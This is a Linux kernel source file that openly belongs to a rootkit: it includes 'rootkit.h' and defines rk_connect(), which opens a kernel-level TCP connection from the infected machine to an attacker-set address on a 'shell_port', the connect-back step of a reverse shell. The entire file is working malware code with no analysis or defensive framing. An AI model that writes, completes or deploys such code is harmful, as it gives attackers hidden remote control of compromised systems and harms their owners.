// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <net/net_namespace.h>

#include "rootkit.h"

/* ------------------------------------------------------------------ */
/* Outbound TCP connect                                                */
/* ------------------------------------------------------------------ */

struct socket *rk_connect(void)
{
	struct sockaddr_in peer = {
		.sin_family = AF_INET,
		.sin_port = htons(shell_port),
	};
	struct socket *sock;
	int error;

	peer.sin_addr.s_addr = in_aton(peer_addr_str);

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
				 IPPROTO_TCP, &sock);
	if (error)
		return ERR_PTR(error);

	error = kernel_connect(sock, (struct sockaddr_unsized *)&peer,
			       sizeof(peer), 0);
	if (error) {
		sock_release(sock);
		return ERR_PTR(error);
	}

	return sock;
}
